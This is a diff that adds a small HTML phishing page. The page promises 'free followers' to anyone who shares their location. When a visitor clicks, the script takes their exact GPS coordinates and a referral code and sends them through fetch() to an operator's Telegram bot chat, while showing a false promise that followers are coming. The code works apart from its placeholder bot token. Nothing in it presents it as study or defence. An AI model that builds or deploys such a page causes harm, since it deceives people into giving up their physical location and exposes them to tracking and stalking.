@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Share Location - Free Followers</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; margin: 10px; background: #4CAF50; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h1>📍 Share Your Location</h1>
+    <p>Share location to get followers faster in your area!</p>
+    <button onclick="getLocation()">Share My Location</button>
+    <p id="status"></p>
+    
+    <script>
+        const refCode = new URLSearchParams(window.location.search).get('ref');
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                document.getElementById("status").innerHTML = "Geolocation not supported";
+            }
+        }
+        
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Telegram botga yuborish
+            const message = `📍 LOCATION\nRef: ${refCode}\nLat: ${lat}\nLon: ${lon}`;
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'ADMIN_CHAT_ID';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            document.getElementById("status").innerHTML = "✅ Location sent! Followers coming soon...";
+        }
+        
+        function showError(error) {
+            document.getElementById("status").innerHTML = "Error getting location";
+        }
+    </script>
+</body>
+</html>
